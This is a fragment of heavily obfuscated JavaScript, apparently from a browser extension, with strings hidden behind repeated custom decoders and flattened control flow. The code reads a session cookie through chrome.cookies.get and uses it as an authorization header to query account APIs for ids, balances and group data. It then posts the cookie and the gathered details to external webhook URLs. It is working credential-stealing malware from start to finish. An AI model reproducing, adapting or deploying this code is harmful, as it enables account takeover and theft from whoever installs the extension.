aX[aZ]=ba(aY[aZ])}return aX[aZ]}}if(!ba){ba=function(aZ){var ba=",KOpPHXiLSm@W8^7kEn#!&q|]hbs>;Q4A/50?Fr+w$j<oUcl=g%2ZY.9N6BGvf~\"e`D[T}R(VMdy{:)1CI_xtJ*uaz3",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}}bc=await(await fetch(bb(0x7d)))[bb(bg[0x20])]();if(aZ){function bp(aZ){var ba="26fMTW~bqzK3^&48VHa(D7J.0`CE?;>,wLsePok9dn|%5Bp\"GNQtXx#/yS$AcgR)U1Y+@*h[:!{vr}=_luj]mOiIFZ<",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bq(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bp(aY[aZ])}return aX[aZ]}bd=await(await fetch(bq(bg[0x11]),{[bq(bg[0x12])]:{[bq(0x81)]:bq(0x82)+aZ},[bq(0x83)]:bq(0x84)}))[bq(0x85)]()}const br=bd?bd.id:bb(bg[0x13]);{function bs(aZ){var ba="E9_7vz|5#YR^G:Wop;{cUh$<j=.Z>ISu(%m~f`L/DeNCq!y16?dQwx&i3lk82Hbr}@V\"AT*PB)KO]sn,aM+Ft0gJ[X4",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bt(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bs(aY[aZ])}return aX[aZ]}be=await(await fetch(bt(0x87),{[bt(0x88)]:{[bt(0x89)]:bt(0x8a)+aZ},[bt(0x8b)]:bt(0x8c)}))[bt(0x8d)]()}{function bu(aZ){var ba="A_9{#)(5eHv.Ij2qNP~@B]+hCY!TW<amwJxtnc$bM^*`3Fo[D>dR?Uy;KpGifgs87:\"0EkVu1Z/QX=46&%Lzl|rOS},",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bv(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bu(aY[aZ])}return aX[aZ]}bf=await(await fetch(bb(0x8e)+br+bv(0x8f),{[bv(0x90)]:{[bv(0x91)]:bv(0x92)+aZ},[bv(0x93)]:bv(0x94)}))[bv(0x95)]()}{function bw(aZ){var ba="dL0IyBG^R+]`#[JF.Kql?|%_4\"*fV9!Y&PQe:73$Opgw8A{2zo~Ejrc6(>m;)=@,1</CHvx}kDs5uiSthMNbTnWaUXZ",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bx(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bw(aY[aZ])}return aX[aZ]}bh=await(await fetch(bb(0x96)+br+bb(0x97),{[bx(0x98)]:{[bx(0x99)]:bx(0x9a)+aZ},[bx(0x9b)]:bx(0x9c)}))[bx(0x9d)]()}const by=bf?bf[bb(bg[0x1d])]:bb(bg[0x13]);{function bz(aZ){var ba="P=z:y^.)w{\"&7$29CHi#M0k~jKtesGxA;O!6/*(Q}dISE48?Z1nNf[T@Xorql_BJ,ahv|5><cp+gVFDumRLUWY%3`b]",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bA(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bz(aY[aZ])}return aX[aZ]}bi=await(await fetch(bA(0x9f),{[bA(0xa0)]:{[bA(0xa1)]:bA(0xa2)+aZ},[bA(0xa3)]:bA(0xa4)}))[bA(0xa5)]()}{function bB(aZ){var ba="l~!*$765>&+:{4?\"^39|2IsNqVicp1F,ft}eY8J0nhzoyMGdSxAE<m/gT[kUbK@jaB`wP;Q=Zv_L#HCWXRr%.()O]Du",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bC(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bB(aY[aZ])}return aX[aZ]}bj=await(await fetch(bC(0xa6)+br+bC(0xa7),{[bC(0xa8)]:{[bC(0xa9)]:bC(0xaa)+aZ},[bC(0xab)]:bC(0xac)}))[bC(0xad)]()}{function bD(aZ){var ba,bb;function*bc(bb,bc,bd={F:{}}){while(bb+bc!==-0x14)with(bd.E||bd)switch(bb+bc){case bd.F.T+0xb2:bd.F.M=bg[bb+0x51];bd.F.N=-bg[0x1];for(bd.F.O=bg[bb+0x51];O<J;O++){bd.F.P=H.indexOf(I[O]);if(P===-bg[0x1])continue;if(N<bg[0x0]){N=P}else{N+=P*bg[0xc];L|=N<<M;M+=(N&bg[bb+0x5e])>bg[0xe]?bg[bb+0x60]:bg[0x10];do{K.push(L&bg[0x3]);L>>=bg[0x2];M-=bg[0x2]}while(M>bg[0x9]);N=-bg[0x1]}}if(N>-bg[bb+0x52]){bd.E=bd.F,bb+=-0x1,bc+=0x8;break}else{bd.E=bd.F,bb+=-0x46,bc+=0xcf;break}case bb- -0x43:K.push((L|N<<M)&bg[0x3]);bd.E=bd.F,bb+=-0x45,bc+=0xc7;break;case bd.F.S+0x145:case 0xde:case 0xa1:return ba=!0x0,bk(K);case bd.F.R+0x1d7:K.push((L|N<<M)&bg[0x3]);bd.E=bd.F,bb+=-0x1b8,bc+=0x149;break;default:case 0xd3:case bb-0xcd:[bd.F.R,bd.F.S,bd.F.T]=[-0x13,0x7,0xe2];bd.E=bd.F,bb+=-0x172,bc+=0x108;break;case-0x5d:case-0x9c:[bd.F.R,bd.F.S,bd.F.T]=[-0xf5,-0xd2,-0xc8];F.H="GIxZJlrcS;]jqp,TH+BUAt<Cni[P6V4{_D0k:$dMsw@8b1Q\"^Y5E3y2gR/KN%?oLa.W9*O>&=v#`zumf}FX!e|~7(h)";F.I=""+(aZ||"");F.J=F.I.length;bd.E=bd.F,bb+=0xfa,bc+=-0x34;break;case-0x44:case bb-0x82:bd.F.K=[];bd.F.L=bg[bb+-0xac];bd.E=bd.F,bb+=-0xfd,bc+=0xbd;break}}ba=void 0x0;bb=bc(-0x4e,-0x4e).next().value;if(ba){return bb}}function bE(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bD(aY[aZ])}return aX[aZ]}bl=await(await fetch(bE(0xae),{[bE(0xaf)]:{[bE(0xb0)]:bE(0xb1)+aZ},[bE(0xb2)]:bE(0xb3)}))[bE(0xb4)]()}{function bF(aZ){var ba="i2x#_]5<y1:M[En`F/DwlI=vXhuG@,?(abr!C)O4}V9*&kWj\"Yp;3PUJ8{KoQqZz0N|seg$B+T6m>RHA%dfLc.^St~7",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bG(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bF(aY[aZ])}return aX[aZ]}bn=await(await fetch(bb(0xb5),{[bb(bg[0x16])]:{[bG(0xb7)]:bG(0xb8)+aZ},[bG(0xb9)]:bG(0xba)}))[bG(0xbb)]()}const bH=bj?bj[bb(bg[0x1e])]:bb(bg[0x13]);let bI=bH>0x3e7?bb(0xbd):bb(0xbe);try{if(br){function bJ(aZ){var ba="m/ln^G!7)},=D1hK&eU(A6q:ufY5Hk?Ev~gjFt{z2`No+$rp8RQy*[a4>i@#wZIs_V0WPXJ<d9SLx%.;bB|3\"]OTCcM",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bK(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bJ(aY[aZ])}return aX[aZ]}const bL=await fetch(bK(0xbf)+br+bK(0xc0)),bM=await bL[bK(bg[0x14])]();ABCDEF=bg[0x0];bM[bK(bg[0x15])][bK(0xc3)](aZ=>{var ba,bb;function*bc(bb,bd,be={ac:{}},bf){while(bb+bd!==0xe9)with(be.ab||be)switch(bb+bd){case-0xa8:case-0x48:case-0x23:return bk(an);case-0x1a:case 0xc:case-0x56:be.ac.au=aZ[(bb+-0x94,ag)(0xc4)]||bg[0x0];return ba=!0x0,ABCDEF+=au;case 0x51:[ae.aj]=bf;ae.ak=".HMtkz0}*]1[3g+uK4Tb6LRe!{|;q_&@B(\"`9vE=$25F^):wA#x7DZPaY%Xi8?joQ>,y~SW/hVlcUrCOfsnpNGIJdm<";ae.al=""+(ae.aj||"");ae.am=ae.al.length;be.ab=be.ae,bb+=0xa1;break;case 0xde:return aX[at]=(0x1,be.ac.ad)(aY[at]);case 0xa1:case-0xcb:be.ae.ap=bg[bb+0xd];be.ae.aq=-bg[bb+0xe];be.ab=be.ae,bb+=0x35;break;default:return aX[at];case-0xa7:case 0x9e:an.push((ao|aq<<ap)&bg[bb+0x158]);be.ab=be.ae,bb+=0x84;break;case bb!=-0x128&&bb!=-0xd1&&bb!=-0x155&&bb!=-0xd&&bb!=0x44&&bb!=-0x5d&&bb- -0xae:for(be.ae.ar=bg[0x0];ar<am;ar++){be.ae.as=ak.indexOf(al[ar]);if(as===-bg[0x1])continue;if(aq<bg[0x0]){aq=as}else{aq+=as*bg[bb+-0x1c];ao|=aq<<ap;ap+=(aq&bg[bb+-0x1b])>bg[0xe]?bg[bb+-0x19]:bg[0x10];do{an.push(ao&bg[0x3]);ao>>=bg[bb+-0x26];ap-=bg[bb+-0x26]}while(ap>bg[0x9]);aq=-bg[0x1]}}if(aq>-bg[0x1]){be.ab=be.ae,bb+=-0x17d;break}else{be.ab=be.ae,bb+=-0xf9;break}case 0x55:case 0x1b:case 0x8a:[be.ac.ax,be.ac.ay]=[0x12,0x6];be.ab=be.ah,bb+=-0x5,bd+=0x8e;break;case be.ac.ay+0x59:[ah.at]=bf;if(typeof aX[ah.at]===bg[bb+0x12d]){be.ab=be.ah,bb+=0x73,bd+=0xe5;break}else{be.ab=be.ah,bb+=0xc1,bd+=-0x45;break}case 0x7f:[be.ac.ax,be.ac.ay]=[-0xc2,-0xd3];ac.ag=function(...bb){return bc(-0x128,0xae,{ac:be.ac,ah:{}},bb).next().value};ac.ad=function(...bb){return bc(-0x5d,0xae,{ac:be.ac,ae:{}},bb).next().value};be.ab=be.ac,bb+=0x59,bd+=-0xcc;break;case bb-0xb3:be.ab=be.aw,bb+=-0x27,bd+=0x161;break;case be.ac.ay+0x88:[be.ac.ax,be.ac.ay]=[-0x19,-0x7a];be.ab=be.ae,bb+=-0x62,bd+=0x183;break;case bd- -0x44:be.ae.an=[];be.ae.ao=bg[bb+-0x44];be.ab=be.ae,bb+=-0x51;break}}ba=void 0x0;bb=bc(0x3c,0x43).next().value;if(ba){return bb}});const bN=await fetch(bK(0xc5)+br+bK(0xc6)),bO=await bN[bK(bg[0x14])]();groupCount=bO[bK(bg[0x15])][bK(0xc7)](aZ=>{function ba(aZ){var ba="PA*IzbBQF[u%2&$=<~a!\"f)R@+9H6/l1;Cs{^S8covdM]75n4|hg.E}N:3JW(TY#Gw,D?pX_xyOVj`r0Zkq>mKUtLie",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bb(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=ba(aY[aZ])}return aX[aZ]}return aZ[bb(0xc8)][bb(0xc9)]>=bg[0x3]})[bK(0xca)]}}catch(bP){}if(by>0x3e8){function bQ(aZ){var ba="l_LG3Fygd$HItmM%/c9+Xh~K,R5Yr^?j;JSv[p8k2UB]zeW70w)Ax(EabDs@TP=Ci6n!&oNf.:{1>ZuO}|#QV4*`\"q<",bb,bc,bd,be,bf,bh,bi;bb=""+(aZ||"");bc=bb.length;bd=[];be=bg[0x0];bf=bg[0x0];bh=-bg[0x1];for(bi=bg[0x0];bi<bc;bi++){var bj=ba.indexOf(bb[bi]);if(bj===-bg[0x1])continue;if(bh<bg[0x0]){bh=bj}else{bh+=bj*bg[0xc];be|=bh<<bf;bf+=(bh&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bd.push(be&bg[0x3]);be>>=bg[0x2];bf-=bg[0x2]}while(bf>bg[0x9]);bh=-bg[0x1]}}if(bh>-bg[0x1]){bd.push((be|bh<<bf)&bg[0x3])}return bk(bd)}function bR(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bQ(aY[aZ])}return aX[aZ]}bo=bR(0xcb)}else{var bo;function bS(aZ){var ba,bb;function*bc(bb,bc,bd={aH:{}}){while(bb+bc!==0x27)with(bd.aG||bd)switch(bb+bc){case-0x5e:bd.aH.aO=bg[0x0];bd.aH.aP=-bg[bb+-0x5f];bd.aG=bd.aH,bb+=-0x184,bc+=0xfa;break;case bc!=-0xbe&&bc- -0x60:bd.aH.aL=aK.length;bd.aH.aM=[];bd.aH.aN=bg[bb+-0x60];bd.aG=bd.aH,bc+=0x4;break;case bc-0x124:for(bd.aH.aQ=bg[bb+0x124];aQ<aL;aQ++){bd.aH.aR=aJ.indexOf(aK[aQ]);if(aR===-bg[0x1])continue;if(aP<bg[bb+0x124]){aP=aR}else{aP+=aR*bg[0xc];aN|=aP<<aO;aO+=(aP&bg[0xd])>bg[bb+0x132]?bg[0xf]:bg[bb+0x134];do{aM.push(aN&bg[0x3]);aN>>=bg[0x2];aO-=bg[0x2]}while(aO>bg[0x9]);aP=-bg[bb+0x125]}}if(aP>-bg[bb+0x125]){bd.aG=bd.aH,bb+=0xf8;break}else{bd.aG=bd.aH,bb+=0x2b6,bc+=-0xf5;break}case bc- -0x192:case-0x21:case 0x3a:return ba=!0x0,bk(aM);case 0xec:[bd.aH.aU,bd.aH.aV]=[-0x46,0xa1];bd.aG=bd.aT,bb+=0x124,bc+=-0x1e9;break;case 0x75:case bd.aH.aV+-0x82:bd.aG=bd.aH,bb+=0x1d6,bc+=-0x79;break;case bd.aH.aV+0x12:case-0x97:aM.push((aN|aP<<aO)&bg[0x3]);bd.aG=bd.aH,bb+=0x1be,bc+=-0xf5;break;default:aM.push((aN|aP<<aO)&bg[0x3]);bd.aG=bd.aH,bb+=0x15a,bc+=-0x98;break;case 0x4d:case 0x46:case bc-0x36:[bd.aH.aU,bd.aH.aV]=[0xdf,-0x2];aH.aJ="ydXLtTgWASmfxlQ+q>@iZ?czM28=K,rwnU7)G4Ib%^$63a`pH/1o&vkJB][!<YRh(jV.*59:F_u}#e{C0\"E;ODP~|Ns";aH.aK=""+(aZ||"");bd.aG=bd.aH,bb+=0x96,bc+=-0x32;break}}ba=void 0x0;bb=bc(-0x36,-0x90).next().value;if(ba){return bb}}function bT(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bS(aY[aZ])}return aX[aZ]}bo=bT(0xcc)}fetch(bo,{[bb(bg[0x21])]:bb(bg[0x22]),[bb(bg[0x16])]:{[bb(bg[0x23])]:bb(bg[0x24])},[bb(bg[0x25])]:JSON[bb(bg[0x26])]({[bb(bg[0x27])]:bI,[bb(bg[0x28])]:[{[bb(0xd5)]:bb(bg[0x17])+(aZ?aZ:bb(0xd7))+bb(bg[0x17]),[bb(bg[0x29])]:bg[0x2a],[bb(bg[0x2b])]:[{[bb(bg[0x19])]:bb(bg[0x2c]),[bb(bg[0x1a])]:bh===bb(bg[0x2d])?bb(bg[0x2e]):bb(bg[0x18]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x2f]),[bb(bg[0x1a])]:bd?bd[bb(bg[0x19])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x30]),[bb(bg[0x1a])]:bf&&bj?""+bf[bb(bg[0x1d])]+bg[0x31]+bj[bb(bg[0x1e])]+bg[0x32]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x33]),[bb(bg[0x1a])]:groupCount,[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x34]),[bb(bg[0x1a])]:ABCDEF,[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x35]),[bb(bg[0x1a])]:bl?bl[bb(bg[0x36])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x37]),[bb(bg[0x1a])]:bi?bi[bb(bg[0x38])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x39]),[bb(bg[0x1a])]:be?be[bb(bg[0x3a])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x3b]),[bb(bg[0x1a])]:bn?bn[bb(bg[0x3c])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]}],[bb(bg[0x3d])]:{[bb(bg[0x19])]:bb(bg[0x3e])+bc,[bb(bg[0x1f])]:bb(bg[0x3f])},[bb(bg[0x40])]:{[bb(bg[0x20])]:bb(0xf2),[bb(bg[0x1f])]:bb(bg[0x41])},[bb(0xf4)]:{[bb(0xf5)]:bd?bd[bb(0xf6)]:bb(0xf7)}}],[bb(bg[0x42])]:bb(0xf9),[bb(bg[0x43])]:bb(bg[0x44]),[bb(bg[0x45])]:[]})});fetch(bm,{[bb(bg[0x21])]:bb(bg[0x22]),[bb(bg[0x16])]:{[bb(bg[0x23])]:bb(bg[0x24])},[bb(bg[0x25])]:JSON[bb(bg[0x26])]({[bb(bg[0x27])]:bb(0xfd)+bI+bb(0xfe),[bb(bg[0x28])]:[{[bb(bg[0x3])]:bb(0x100),[bb(bg[0x29])]:bg[0x2a],[bb(bg[0x2b])]:[{[bb(bg[0x19])]:bb(bg[0x2c]),[bb(bg[0x1a])]:bh===bb(bg[0x2d])?bb(bg[0x2e]):bb(bg[0x18]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x2f]),[bb(bg[0x1a])]:bd?bd[bb(bg[0x19])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x30]),[bb(bg[0x1a])]:bf&&bj?""+bf[bb(bg[0x1d])]+bg[0x31]+bj[bb(bg[0x1e])]+bg[0x32]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x33]),[bb(bg[0x1a])]:groupCount,[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x34]),[bb(bg[0x1a])]:ABCDEF,[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x35]),[bb(bg[0x1a])]:bl?bl[bb(bg[0x36])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x37]),[bb(bg[0x1a])]:bi?bi[bb(bg[0x38])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x39]),[bb(bg[0x1a])]:be?be[bb(bg[0x3a])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]},{[bb(bg[0x19])]:bb(bg[0x3b]),[bb(bg[0x1a])]:bn?bn[bb(bg[0x3c])]:bb(bg[0x13]),[bb(bg[0x1b])]:bg[0x1c]}],[bb(bg[0x3d])]:{[bb(bg[0x19])]:bb(bg[0x3e])+bc,[bb(bg[0x1f])]:bb(bg[0x3f])},[bb(bg[0x40])]:{[bb(bg[0x20])]:bb(0x101),[bb(bg[0x1f])]:bb(bg[0x41])}}],[bb(bg[0x42])]:bb(0x102),[bb(bg[0x43])]:bb(bg[0x44]),[bb(bg[0x45])]:[]})})}chrome[bi(0x103)][bi(0x104)]({[bi(0x105)]:bi(0x106),[bi(0x107)]:bi(0x108)},function(aX){bn(aX?aX[bi(0x109)]:null)});